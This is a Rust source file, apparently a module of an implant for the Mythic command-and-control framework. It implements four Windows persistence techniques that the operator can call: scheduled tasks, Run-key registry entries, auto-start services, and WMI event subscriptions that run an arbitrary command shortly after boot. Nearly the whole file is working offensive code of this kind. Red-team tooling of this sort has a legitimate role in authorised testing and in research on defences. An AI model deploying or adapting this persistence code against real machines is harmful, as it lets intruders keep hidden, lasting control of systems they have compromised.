use crate::{AgentTask, mythic_success, mythic_error};
use serde::Deserialize;

#[cfg(target_os = "windows")]
use std::process::Command;

#[derive(Debug, Deserialize)]
struct SchtaskArgs {
    name: String,
    action: String,
    #[serde(default)]
    command: String,
    #[serde(default)]
    schedule: String,
}

#[derive(Debug, Deserialize)]
struct RegistryArgs {
    action: String,
    #[serde(default)]
    key: String,
    name: String,
    #[serde(default)]
    value: String,
}

#[derive(Debug, Deserialize)]
struct ServiceArgs {
    action: String,
    name: String,
    #[serde(default)]
    display_name: String,
    #[serde(default)]
    bin_path: String,
}

#[derive(Debug, Deserialize)]
struct WmiArgs {
    action: String,
    name: String,
    #[serde(default)]
    command: String,
    #[serde(default)]
    trigger: String,
}

// ============================================================================
// persist_schtask - Create/delete scheduled task persistence
// ============================================================================
#[cfg(target_os = "windows")]
pub fn persist_schtask(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: SchtaskArgs = serde_json::from_str(&task.parameters)?;

    match args.action.as_str() {
        "create" => {
            if args.command.is_empty() {
                return Ok(mythic_error!(task.id, "Command required for creating scheduled task"));
            }

            let schedule = if args.schedule.is_empty() {
                "DAILY /ST 09:00".to_string()
            } else {
                args.schedule.clone()
            };

            // Parse schedule parts (e.g., "DAILY /ST 09:00")
            let schedule_parts: Vec<&str> = schedule.split_whitespace().collect();
            if schedule_parts.len() < 3 {
                return Ok(mythic_error!(task.id, "Invalid schedule format. Expected: 'DAILY /ST 09:00'"));
            }

            let output = Command::new("schtasks")
                .args(&[
                    "/Create",
                    "/TN", &args.name,
                    "/TR", &args.command,
                    "/SC", schedule_parts[0],
                    schedule_parts[1], schedule_parts[2],
                    "/F"
                ])
                .output()?;

            if output.status.success() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                Ok(mythic_success!(task.id, format!("Created scheduled task '{}': {}", args.name, stdout.trim())))
            } else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                Ok(mythic_error!(task.id, format!("Failed to create scheduled task: {}", stderr.trim())))
            }
        }
        "delete" => {
            let output = Command::new("schtasks")
                .args(&["/Delete", "/TN", &args.name, "/F"])
                .output()?;

            if output.status.success() {
                Ok(mythic_success!(task.id, format!("Deleted scheduled task '{}'", args.name)))
            } else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                Ok(mythic_error!(task.id, format!("Failed to delete scheduled task: {}", stderr.trim())))
            }
        }
        _ => Ok(mythic_error!(task.id, format!("Invalid action: {}. Use 'create' or 'delete'", args.action))),
    }
}

#[cfg(not(target_os = "windows"))]
pub fn persist_schtask(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "persist_schtask is only supported on Windows"))
}

// ============================================================================
// persist_registry - Create/delete registry persistence
// ============================================================================
#[cfg(target_os = "windows")]
pub fn persist_registry(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: RegistryArgs = serde_json::from_str(&task.parameters)?;

    let key = if args.key.is_empty() {
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run".to_string()
    } else {
        args.key.clone()
    };

    match args.action.as_str() {
        "create" => {
            if args.value.is_empty() {
                return Ok(mythic_error!(task.id, "Value data required for creating registry entry"));
            }

            let output = Command::new("reg")
                .args(&["add", &key, "/v", &args.name, "/d", &args.value, "/f"])
                .output()?;

            if output.status.success() {
                Ok(mythic_success!(task.id, format!("Created registry entry: {}\\{}", key, args.name)))
            } else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                Ok(mythic_error!(task.id, format!("Failed to create registry entry: {}", stderr.trim())))
            }
        }
        "delete" => {
            let output = Command::new("reg")
                .args(&["delete", &key, "/v", &args.name, "/f"])
                .output()?;

            if output.status.success() {
                Ok(mythic_success!(task.id, format!("Deleted registry entry: {}\\{}", key, args.name)))
            } else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                Ok(mythic_error!(task.id, format!("Failed to delete registry entry: {}", stderr.trim())))
            }
        }
        _ => Ok(mythic_error!(task.id, format!("Invalid action: {}. Use 'create' or 'delete'", args.action))),
    }
}

#[cfg(not(target_os = "windows"))]
pub fn persist_registry(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "persist_registry is only supported on Windows"))
}

// ============================================================================
// persist_service - Create/delete service persistence
// ============================================================================
#[cfg(target_os = "windows")]
pub fn persist_service(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: ServiceArgs = serde_json::from_str(&task.parameters)?;

    match args.action.as_str() {
        "create" => {
            if args.display_name.is_empty() || args.bin_path.is_empty() {
                return Ok(mythic_error!(task.id, "Display name and binary path required for creating service"));
            }

            let output = Command::new("sc")
                .args(&[
                    "create",
                    &args.name,
                    &format!("displayname={}", args.display_name),
                    &format!("binpath={}", args.bin_path),
                    "start=auto"
                ])
                .output()?;

            if output.status.success() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                Ok(mythic_success!(task.id, format!("Created service '{}': {}", args.name, stdout.trim())))
            } else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                Ok(mythic_error!(task.id, format!("Failed to create service: {}", stderr.trim())))
            }
        }
        "delete" => {
            // Stop the service first (ignore errors if already stopped)
            let _ = Command::new("sc")
                .args(&["stop", &args.name])
                .output();

            // Delete the service
            let output = Command::new("sc")
                .args(&["delete", &args.name])
                .output()?;

            if output.status.success() {
                Ok(mythic_success!(task.id, format!("Deleted service '{}'", args.name)))
            } else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                Ok(mythic_error!(task.id, format!("Failed to delete service: {}", stderr.trim())))
            }
        }
        _ => Ok(mythic_error!(task.id, format!("Invalid action: {}. Use 'create' or 'delete'", args.action))),
    }
}

#[cfg(not(target_os = "windows"))]
pub fn persist_service(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "persist_service is only supported on Windows"))
}

// ============================================================================
// persist_wmi - Create/delete WMI event subscription persistence
// ============================================================================
#[cfg(target_os = "windows")]
pub fn persist_wmi(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: WmiArgs = serde_json::from_str(&task.parameters)?;

    match args.action.as_str() {
        "create" => {
            if args.command.is_empty() {
                return Ok(mythic_error!(task.id, "Command required for creating WMI event subscription"));
            }

            let trigger = if args.trigger.is_empty() || args.trigger == "startup" {
                "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
            } else {
                &args.trigger
            };

            // Escape command for PowerShell
            let escaped_command = args.command.replace("'", "''");
            let filter_name = format!("{}Filter", args.name);
            let consumer_name = format!("{}Consumer", args.name);

            // PowerShell command to create WMI event subscription
            let ps_script = format!(
                r#"
                $Filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\subscription' -Arguments @{{
                    Name = '{}'
                    EventNameSpace = 'root\cimv2'
                    QueryLanguage = 'WQL'
                    Query = '{}'
                }}
                $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\subscription' -Arguments @{{
                    Name = '{}'
                    CommandLineTemplate = '{}'
                }}
                $Binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\subscription' -Arguments @{{
                    Filter = $Filter
                    Consumer = $Consumer
                }}
                if ($Binding) {{ Write-Host 'WMI event subscription created successfully' }} else {{ Write-Error 'Failed to create binding' }}
                "#,
                filter_name, trigger, consumer_name, escaped_command
            );

            let output = Command::new("powershell")
                .args(&["-NoProfile", "-NonInteractive", "-Command", &ps_script])
                .output()?;

            if output.status.success() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                Ok(mythic_success!(task.id, format!("Created WMI event subscription '{}': {}", args.name, stdout.trim())))
            } else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                Ok(mythic_error!(task.id, format!("Failed to create WMI event subscription: {}", stderr.trim())))
            }
        }
        "delete" => {
            let filter_name = format!("{}Filter", args.name);
            let consumer_name = format!("{}Consumer", args.name);

            let ps_script = format!(
                r#"
                Get-WmiObject -Namespace 'root\subscription' -Class __FilterToConsumerBinding | Where-Object {{ $_.Filter.Name -eq '{}' -or $_.Consumer.Name -eq '{}' }} | Remove-WmiObject
                Get-WmiObject -Namespace 'root\subscription' -Class __EventFilter | Where-Object {{ $_.Name -eq '{}' }} | Remove-WmiObject
                Get-WmiObject -Namespace 'root\subscription' -Class CommandLineEventConsumer | Where-Object {{ $_.Name -eq '{}' }} | Remove-WmiObject
                Write-Host 'WMI event subscription removed'
                "#,
                filter_name, consumer_name, filter_name, consumer_name
            );

            let output = Command::new("powershell")
                .args(&["-NoProfile", "-NonInteractive", "-Command", &ps_script])
                .output()?;

            if output.status.success() {
                Ok(mythic_success!(task.id, format!("Deleted WMI event subscription '{}'", args.name)))
            } else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                Ok(mythic_error!(task.id, format!("Failed to delete WMI event subscription: {}", stderr.trim())))
            }
        }
        _ => Ok(mythic_error!(task.id, format!("Invalid action: {}. Use 'create' or 'delete'", args.action))),
    }
}

#[cfg(not(target_os = "windows"))]
pub fn persist_wmi(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "persist_wmi is only supported on Windows"))
}
